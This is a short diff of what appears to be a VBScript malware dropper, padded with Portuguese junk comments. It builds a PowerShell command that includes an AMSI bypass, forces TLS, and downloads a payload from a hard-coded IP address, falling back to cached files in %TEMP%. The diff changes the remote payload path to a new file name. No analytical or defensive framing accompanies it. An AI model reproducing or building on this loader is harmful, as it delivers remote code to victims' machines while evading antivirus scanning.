@@ -572,7 +572,7 @@ amsi = "$c='using System;using System.Runtime.InteropServices;public class P{[Dl
 
 Dim ps, finalCmd
 ps = "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=3072;" & amsi & _
-     "$u='http://157.245.45.38/z.txt';" & _
+     "$u='http://157.245.45.38/afffggg.txt';" & _
      "$b='';try{$b=(iwr -Uri $u -UseBasicParsing -TimeoutSec 20).Content}catch{};" & _
      "if(!$b){$t1='%TEMP%\a.txt';if(Test-Path $t1){$b=gc $t1 -Raw}};" & _
      "if(!$b){$t2='%TEMP%\b.txt';if(Test-Path $t2){$b=gc $t2 -Raw}};" & _
@@ -1106,4 +1106,5 @@ End Sub
 ' Lixo coment�rio extra fim 298
 ' Lixo coment�rio extra fim 299
 ' Lixo coment�rio extra fim 300
+
 
